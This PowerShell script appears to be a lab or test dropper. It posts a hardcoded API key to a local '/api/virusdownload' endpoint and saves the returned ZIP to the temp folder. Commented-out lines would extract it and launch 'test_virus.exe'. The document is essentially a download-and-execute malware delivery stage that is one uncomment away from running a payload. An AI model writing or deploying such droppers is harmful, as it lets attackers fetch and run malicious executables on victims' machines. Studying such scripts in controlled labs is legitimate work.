# PowerShell Script Content
$apiKey = "superSecretApiKey"
$url = "http://127.0.0.1:5000/api/virusdownload"
$zipPath = "$env:temp\downloaded.zip"
$extractPath = "$env:temp\extracted"
$exePath = "$extractPath\test_virus.exe"

# Download the ZIP file
Invoke-WebRequest -Uri $url -Method POST -Headers @{"Content-Type"="application/json"} -Body (@{api_key=$apiKey} | ConvertTo-Json) -OutFile $zipPath

# # Extract the ZIP file
# Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

# # Execute the extracted EXE
# Start-Process -FilePath $exePath -Wait